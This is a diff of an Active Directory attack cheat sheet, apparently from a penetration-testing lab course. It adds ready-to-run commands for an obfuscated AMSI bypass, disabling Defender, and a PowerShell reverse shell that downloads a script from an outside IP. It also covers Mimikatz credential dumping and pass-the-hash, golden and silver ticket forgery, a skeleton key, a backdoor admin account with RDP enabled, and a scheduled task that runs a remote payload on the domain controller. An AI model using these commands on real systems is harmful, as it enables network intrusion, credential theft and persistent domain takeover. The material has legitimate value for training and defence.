@@ -4,50 +4,29 @@
 * [General](#General)
 * [Domain Enumeration](#Domain-Enumeration)
     * [Powerview Domain](#Powerview-Domain)
-    * [Powerview Domain](#Powerview-users,-groups-and-computers)
-    * [Powerview Domain](#Powerview-shares)
+    * [Powerview Users, groups and computers](#Powerview-users,-groups-and-computers)
+    * [Powerview Shares](#Powerview-shares)
     * [Powerview GPO](#Powerview-GPO)
     * [Powerview ACL](#Powerview-ACL)
     * [Powerview Domain Trust](#Powerview-Domain-Trust)
-    * [Powerview Misc](#Powerview-Misc)
+    * [Powerview Misc](#Powerview-Misc) 
+* [Local privilege escalation](#Local-privilege-escalation)
+* [Lateral Movement](#Lateral-Movement)
+   * [Mimikatz](#Mimikatz) 
+* [Domain Persistence](#Domain-Persistence)
+   * [Golden Ticket](#Golden-Ticket) 
+
 
 # General
-#### Connect to machine with administrator privs
+#### Check for admin access of a machine
 ```
-Enter-PSSession -Computername <computername>
-$sess = New-PSSession -Computername <computername>
-Enter-PSSession $sess
+ls \\computername\c$
 ```
 
-#### Execute commands on a machine
-```
-Invoke-Command -Computername <computername> -Scriptblock {whoami} 
-Invoke-Command -Scriptblock {whoami} $sess
-```
-
-#### Load script on a machine
-```
-Invoke-Command -Computername <computername> -FilePath "<path>"
-Invoke-Command -FilePath "<path>" $sess
-```
-
-#### Download and load script on a machine
-```
-iex (iwr http://xxx.xxx.xxx.xxx/<scriptname> -UseBasicParsing)
-```
-
-#### AMSI Bypass
-```
-sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
-```
-
-#### Disable AV monitoring
-```
-Set-MpPreference -DisableRealtimeMonitoring $true
-```
 
 # Domain Enumeration
 ## Powerview Domain
+https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 ```
 . C:\ad\tools\PowerView.ps1
 ```
@@ -257,8 +236,8 @@ Get-NetForestTrust -Forest eurocorp.local
 Get-NetForestDomain -Verbose | Get-NetDomainTrust
 ```
 
-## Powerview Misc
-####  Find all machines on the current domain where the current user has local admin access
+## Misc
+####  Powerview Find all machines on the current domain where the current user has local admin access
 ```
 Find-LocalAdminAccess -Verbose
 
@@ -266,7 +245,7 @@ Find-LocalAdminAccess -Verbose
 Find-WMILocalAdminAccess
 ```
 
-####  Find local admins on all machines of the domain (needs admin privs)
+####  Powerview Find local admins on all machines of the domain (needs admin privs)
 ```
 Invoke-EnumerateLocalAdmin -Verbose
 
@@ -287,8 +266,180 @@ Invoke-UserHunter -Groupname "RDPUsers"
 Invoke-UserHunter -CheckAccess
 ```
 
-####  
+####  BloodHound
+```
+. ./sharphound.ps1
+Invoke-Bloodhound -CollectionMethod all -Verbose
+Invoke-Bloodhound -CollectionMethod LoggedOn -Verbose
+Run neo4j.bat
+#Install and start the service
+Run BloodHound.exe
 ```
 
+####  Powershell reverse shell
+```
+Powershell.exe iex (iwr http://172.16.100.244/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.244 -Port 443
 ```
 
+# Local privilege escalation
+https://github.com/HarmJ0y/PowerUp
+https://github.com/AlessandroZ/BeRoot
+https://github.com/enjoiz/Privesc
+
+Focussing on Service issues
+### Privesc check all
+```
+. ./Invoke-PrivEsc
+Invoke-PrivEsc
+```
+
+### Beroot check all
+```
+./beRoot.exe
+```
+
+####  Run powerup check all
+```
+. ./powerup
+Invoke-allchecks
+```
+
+####  Run powerup get services with unqouted paths and a space in their name
+```
+Get-ServiceUnqouted -Verbose
+Get-ModifiableServiceFile -Verbose
+```
+
+####  Abuse service to get local admin permissions with powerup
+```
+Invoke-ServiceAbuse
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student244'
+```
+
+####  Jekins
+```
+Runs as local admin, go to /job/project/configure to try to see if you have build permissions in /job/project0/configure
+Execute windows or shell comand into the build, you can also use powershell scripts
+```
+
+### Add user to local admin and RDP group and enable RDP on firewall
+```
+net user student244 SuWYn9WDHp86xk6M /add /Y   && net localgroup administrators student244 /add   && net localgroup "Remote Desktop Users" student244 /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+```
+
+# Lateral Movement
+#### Connect to machine with administrator privs
+```
+Enter-PSSession -Computername <computername>
+$sess = New-PSSession -Computername <computername>
+Enter-PSSession $sess
+```
+
+#### Execute commands on a machine
+```
+Invoke-Command -Computername <computername> -Scriptblock {whoami} 
+Invoke-Command -Scriptblock {whoami} $sess
+```
+
+#### Load script on a machine
+```
+Invoke-Command -Computername <computername> -FilePath "<path>"
+Invoke-Command -FilePath "<path>" $sess
+```
+
+#### Download and load script on a machine
+```
+iex (iwr http://xxx.xxx.xxx.xxx/<scriptname> -UseBasicParsing)
+```
+
+#### AMSI Bypass
+```
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+#### Disable AV monitoring
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+#### Execute locally loaded function on the remote machines
+```
+Invoke-Command -Scriptblock ${function:Get-PassHashes} -Computername (Get-Content <list_of_servers>)
+```
+
+## Mimikatz
+#### Mimikatz dump credentials on local machine
+```
+Invoke-Mimikatz -Dumpcreds
+```
+
+#### Mimikatz dump credentials on multiple remote machines
+```
+Invoke-Mimikatz -Dumpcreds -Computername @(“sys1”,”sys2”)
+```
+
+#### Mimikatz start powershell pass the hash
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:<ntlm hash> /run:powershell.exe"'
+```
+
+#### Check the language mode
+```
+$ExecutionContext.SessionState.LanguageMode
+```
+
+#### Enumerate applocker policy
+```
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
+#### Copy item to other server
+```
+Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
+
+# Domain persistence
+## Golden ticket
+#### Dump hashes - Get the krbtgt hash
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
+```
+
+#### Make golden ticket
+```
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+
+#use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
+#sid = full sid of anything minus the last block
+```
+
+#### Use the DCSync feature for getting krbtgt hash execute with DA privileges
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+
+## Silver ticket
+#### Make silver ticket
+```
+#Use the hash of the local computer
+
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:f3daa97a026858a2665f17a4a83a150a /user:Administrator /ptt"'
+
+#Execute for WMI /service:HOST /service:RPCSS
+```
+
+#### Schedule and execute a task
+```
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.244/Invoke-PowerShellTcp.ps1''')'"
+
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN “Reverse”
+```
+
+## Skeleton key
+#### Create the skeleton key
+```
+#Leaves a big gap in their security!
+Invoke-MimiKatz -Command ‘”privilege::debug” “misc::skeleton”’ -Computername dcorp-dc.dollarcorp.moneycorp.local
+
+#access any machine with the password mimikatz
+```
